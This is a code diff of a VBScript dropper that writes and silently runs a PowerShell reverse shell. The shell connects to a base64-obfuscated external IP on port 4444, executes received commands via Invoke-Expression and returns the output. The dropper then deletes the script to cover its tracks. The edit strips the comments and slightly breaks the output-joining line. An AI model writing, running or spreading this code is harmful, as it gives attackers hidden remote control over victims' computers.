@@ -1,11 +1,9 @@
-Dim revsh, objFSO, objShell, strCommand
-revsh = Environ("TEMP") & "\838e861f-78c6-4d73-8d6f-743bc6beadaf.ps1"
+Dim revsh, objFSO, objShell, strCommand, tempFolder
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("WScript.Shell")
-
-' Create the PowerShell script
+tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
+revsh = tempFolder & "\838e861f-78c6-4d73-8d6f-743bc6beadaf.ps1"
 Set objFile = objFSO.CreateTextFile(revsh, True)
-
 objFile.WriteLine "try {"
 objFile.WriteLine "    $i = 'NDUuOTMuMTM2LjI4'"
 objFile.WriteLine "    $k = 'NDQ0NA=='"
@@ -25,7 +23,7 @@ objFile.WriteLine "        }"
 objFile.WriteLine "        try {"
 objFile.WriteLine "            $output = Invoke-Expression $command 2>&1"
 objFile.WriteLine "            if ($output -is [System.Collections.IEnumerable] -and -not ($output -is [string])) {"
-objFile.WriteLine "                $output = $output -join '`n'"
+objFile.WriteLine "                $output = $output -join 'n'"
 objFile.WriteLine "            }"
 objFile.WriteLine "        } catch {"
 objFile.WriteLine "            $output = 'error: ' + $_"
@@ -41,10 +39,6 @@ objFile.WriteLine "        $client.Close()"
 objFile.WriteLine "    }"
 objFile.WriteLine "}"
 objFile.Close
-
-' Execute the PowerShell script
 strCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & revsh & """"
 objShell.Run strCommand, 0, True
-
-' Delete the temporary script
 objFSO.DeleteFile(revsh)
